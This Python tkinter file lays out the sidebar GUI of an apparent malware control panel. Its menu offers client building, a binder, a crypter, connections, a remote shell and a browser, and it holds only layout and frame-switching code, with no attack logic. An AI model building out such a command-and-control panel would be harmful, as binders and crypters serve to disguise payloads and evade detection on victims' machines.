import tkinter as tk
from tkinter import ttk
from builder import BuilderFrame
from binder import BinderFrame
from crypter import CrypterFrame
from connections import ConnectionsFrame
from libraries import LibrariesFrame
from shell import ShellFrame
from browser import JavaBrowserFrame
from settings import SettingsFrame

class ControlCommandCenterGUI(tk.Frame):
    def __init__(self, root):
        super().__init__(root)
        self.root = root
        self.current_frame = None
        self.pack_propagate(0)
        self.create_widgets()

    def create_widgets(self):
        self.sidebar_panel = tk.Frame(self, width=200, bg="darkgray")
        self.sidebar_panel.pack(side="left", fill="y")

        options = ["Build Client", "Binder", "Crypter", "Connections", "Libraries", "Shell", "Browser", "Settings"]  # Replace with your desired options

        for option in options:
            btn = ttk.Button(self.sidebar_panel, text=option, command=lambda opt=option: self.option_selected(opt))
            btn.pack(pady=10)

        self.main_frame = tk.Frame(self)
        self.main_frame.pack(side="right", fill="both", expand=True)

    def option_selected(self, option):
        self.hide_all_frames()

        if option == "Build Client":
            builder_frame = BuilderFrame(self.main_frame, self.back_button_click)
            builder_frame.pack(side="top", fill="both", expand=True)
            self.current_frame = builder_frame

        elif option == "Binder":
            binder_frame = BinderFrame(self.main_frame, self.back_button_click)
            binder_frame.pack(side="top", fill="both", expand=True)
            self.current_frame = binder_frame
            
        elif option == "Crypter":
            crypter_frame = CrypterFrame(self.main_frame, self.back_button_click)
            crypter_frame.pack(side="top", fill="both", expand=True)
            self.current_frame = crypter_frame    
            
        elif option == "Connections":
            connections_frame = ConnectionsFrame(self.main_frame, self.back_button_click)
            connections_frame.pack(side="top", fill="both", expand=True)
            self.current_frame = connections_frame
            
        elif option == "Libraries":
            libraries_frame = LibrariesFrame(self.main_frame, self.back_button_click)
            libraries_frame.pack(side="top", fill="both", expand=True)
            self.current_frame = libraries_frame
            
        elif option == "Shell":
            shell_frame = ShellFrame(self.main_frame, self.back_button_click)
            shell_frame.pack(side="top", fill="both", expand=True)
            self.current_frame = shell_frame
  
        elif option == "Browser":  # Add option for "Browser"
            browser_frame = JavaBrowserFrame(self.main_frame)
            browser_frame.pack(side="top", fill="both", expand=True)
            self.current_frame = browser_frame
            
        elif option == "Settings":
            settings_frame = SettingsFrame(self.main_frame, self.back_button_click)
            settings_frame.pack(side="top", fill="both", expand=True)
            self.current_frame = settings_frame    
            

        # Add other options' frames here

    def hide_all_frames(self):
        if self.current_frame:
            self.current_frame.pack_forget()

    def back_button_click(self):
        self.hide_all_frames()
        self.show_option_selection()

    def show_option_selection(self):
        self.sidebar_panel.pack(side="left", fill="y")
